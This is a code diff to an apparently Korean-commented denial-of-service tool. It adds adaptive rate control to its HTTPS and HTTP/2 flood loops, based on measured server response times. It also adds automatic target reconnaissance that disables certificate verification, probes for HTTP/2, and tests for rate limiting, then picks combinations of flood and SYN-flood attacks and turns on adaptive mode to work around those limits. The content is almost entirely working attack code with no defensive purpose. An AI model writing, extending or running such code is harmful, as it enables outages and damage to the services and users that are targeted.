@@ -1112,11 +1112,17 @@ def _mp_https_flood(args_tuple):
             if _JITTER[0] > 0:
                 import random as _rj
                 _time.sleep(_rj.uniform(0, _JITTER[0]))
+            _t_send = _time.time()
             ssock.sendall(req)
             data = ssock.recv(65535)
+            _t_recv = _time.time()
             if not data:
                 break
             sent += 1
+            # v8.1: 적응형 공격 - 응답 시간 측정 + RPS 조절
+            if _ADAPTIVE[0]:
+                _resp_ms = (_t_recv - _t_send) * 1000.0
+                _adaptive_adjust(_resp_ms, _t_recv)
         except Exception:
             # Reconnect with 0-RTT if session cached
             if cached_session is not None:
@@ -1862,6 +1868,7 @@ def _mp_h2_flood(args_tuple):
                     ]
                     conn.send_headers(stream_id, headers, end_stream=True)
                 data = conn.data_to_send()
+                _t_send = _time.time()
                 if data:
                     ssock.sendall(data)
                 sent += min(streams, 100)
@@ -1879,8 +1886,11 @@ def _mp_h2_flood(args_tuple):
                                 pass  # just drain
                     except _socket.timeout:
                         break
-                    except Exception:
-                        break
+                # v8.1: 적응형 공격 - 응답 시간 측정 + RPS 조절
+                _t_recv = _time.time()
+                if _ADAPTIVE[0]:
+                    _resp_ms = (_t_recv - _t_send) * 1000.0
+                    _adaptive_adjust(_resp_ms, _t_recv)
             except Exception:
                 break
         ssock.close()
@@ -3313,32 +3323,92 @@ examples:
     if args.auto_full:
         print("[auto-full] 시작: 탐지 → 스캔 → 전략 → 공격 → 적응", file=sys.stderr)
         
-        # 1. Target detection
+        # 1. Target detection (actual probing)
         print("[auto-full] 1/5: 대상 탐지...", file=sys.stderr)
-        # Check if target supports HTTPS
-        # Check if target supports H2
-        # Check if target has WebSocket
         detected_protocols = []
-        if 'https://' in args.url:
-            detected_protocols.append('https')
-        else:
-            detected_protocols.append('http')
-        print(f"[auto-full] detected protocols: {', '.join(detected_protocols)}", file=sys.stderr)
+        protocol_version = 'http/1.1'
         
-        # 2. Vulnerability scan (simplified)
+        # Probe HTTP/HTTPS
+        from urllib.parse import urlparse as _up
+        parsed = _up(args.url)
+        host = parsed.hostname
+        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+        scheme = parsed.scheme or 'http'
+        
+        # Try HTTP
+        try:
+            import socket as _sock
+            import ssl as _ssl
+            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+            s.settimeout(3.0)
+            s.connect((host, port))
+            if scheme == 'https':
+                ctx = _ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = _ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=host)
+                # Check ALPN for H2
+                if s.selected_alpn_protocol == 'h2':
+                    protocol_version = 'h2'
+                detected_protocols.append('https')
+            else:
+                # Send HTTP/1.1 request
+                req = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
+                s.sendall(req.encode())
+                resp = s.recv(4096).decode()
+                if 'HTTP/2' in resp:
+                    protocol_version = 'h2'
+                detected_protocols.append('http')
+            s.close()
+        except Exception as e:
+            print(f"[auto-full] probe failed: {e}", file=sys.stderr)
+            detected_protocols.append(scheme)
+        
+        print(f"[auto-full] detected: {', '.join(detected_protocols)} ({protocol_version})", file=sys.stderr)
+        
+        # 2. Vulnerability scan (rate limit test)
         print("[auto-full] 2/5: 취약점 스캔...", file=sys.stderr)
-        # Test rate limit (send 10 rapid requests, check for 429)
-        # Test timeout (send large payload, check response time)
-        # Simplified: assume standard web server
-        print("[auto-full] scan complete (standard web server assumed)", file=sys.stderr)
+        rate_limit_detected = False
+        try:
+            import socket as _sock
+            import ssl as _ssl
+            for i in range(10):
+                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+                s.settimeout(2.0)
+                s.connect((host, port))
+                if scheme == 'https':
+                    ctx = _ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = _ssl.CERT_NONE
+                    s = ctx.wrap_socket(s, server_hostname=host)
+                req = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
+                s.sendall(req.encode())
+                resp = s.recv(4096).decode()
+                if '429' in resp.split('\r\n')[0]:
+                    rate_limit_detected = True
+                    break
+                s.close()
+        except Exception:
+            pass
+        print(f"[auto-full] rate limit: {'YES' if rate_limit_detected else 'NO'}", file=sys.stderr)
         
-        # 3. Strategy selection
+        # 3. Strategy selection (based on actual detection)
         print("[auto-full] 3/5: 최적 전략 선택...", file=sys.stderr)
         # Based on detection, choose best combo
         if 'https' in detected_protocols:
-            strategy = ['https', 'h2', 'syn']  # TLS + H2 + SYN
+            if protocol_version == 'h2':
+                strategy = ['h2', 'httpsmp', 'syn']  # H2 + TLS multiproc + SYN
+            else:
+                strategy = ['httpsmp', 'syn']  # TLS multiproc + SYN
         else:
-            strategy = ['http', 'tcp', 'syn']  # HTTP + TCP + SYN
+            if protocol_version == 'h2':
+                strategy = ['h2mp', 'raw', 'syn']  # H2 multiproc + raw + SYN
+            else:
+                strategy = ['raw', 'syn']  # raw + SYN
+        # If rate limit detected, add adaptive
+        if rate_limit_detected:
+            print("[auto-full] rate limit detected → enabling adaptive", file=sys.stderr)
+            _ADAPTIVE[0] = True
         print(f"[auto-full] strategy: {', '.join(strategy)}", file=sys.stderr)
         
         # 4. Start attack (use strategy as modes)
